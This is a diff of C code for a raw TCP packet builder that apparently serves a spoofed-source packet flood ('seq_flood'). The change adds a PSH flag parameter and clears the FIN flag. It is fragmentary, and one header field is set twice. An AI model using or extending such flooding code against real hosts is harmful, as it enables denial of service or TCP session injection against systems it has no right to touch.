@@ -27,7 +27,7 @@ bool seq_flood(     char *srcIP,
     char *packet = (char *) malloc(packet_size);
     struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
 
-    fill_packet(srcIP, dstIP, dstPort, srcPort, 0, 0, seq, ack_seq, 0, data, packet, packet_size);
+    fill_packet(srcIP, dstIP, dstPort, srcPort, SYN_OFF, ACK_OFF, PSH_OFF, seq, ack_seq, 0, data, packet, packet_size);
 
     int i;
     bool b = true;
@@ -56,6 +56,7 @@ void fill_packet(   char *srcIP,
                     u_int16_t srcPort,
                     u_int32_t syn,
                     u_int16_t ack,
+                    u_int16_t psh,
                     u_int32_t seq,
                     u_int32_t ack_seq,
                     u_int16_t rst,
@@ -95,10 +96,10 @@ void fill_packet(   char *srcIP,
     tcpHdr->ack_seq = htonl(ack_seq);   //ack sequence number, depends whether ACK is set or not
     tcpHdr->res1 = 0;
     tcpHdr->doff = 0x8;
-    tcpHdr->fin = 1;
+    tcpHdr->fin = 0;
     tcpHdr->syn = syn;
     tcpHdr->rst = 0;
-    tcpHdr->psh = 0;
+    tcpHdr->psh = psh;
     tcpHdr->ack = ack;                  //if you are acknowledging a sec number
     tcpHdr->ack = 1;
     tcpHdr->urg = 0;
@@ -161,6 +162,7 @@ char* gen_packet(   char *srcIP,
                     u_int16_t srcPort,
                     u_int32_t syn,
                     u_int16_t ack,
+                    u_int16_t psh,
                     u_int32_t seq,
                     u_int32_t ack_seq,
                     const char * data,
@@ -168,6 +170,6 @@ char* gen_packet(   char *srcIP,
 
 
         char * packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data));
-        fill_packet(srcIP, dstIP, dstPort, srcPort, syn, ack, seq, ack_seq, 0, data, packet, packet_size);
+        fill_packet(srcIP, dstIP, dstPort, srcPort, syn, ack, psh, seq, ack_seq, 0, data, packet, packet_size);
         return packet;
 }
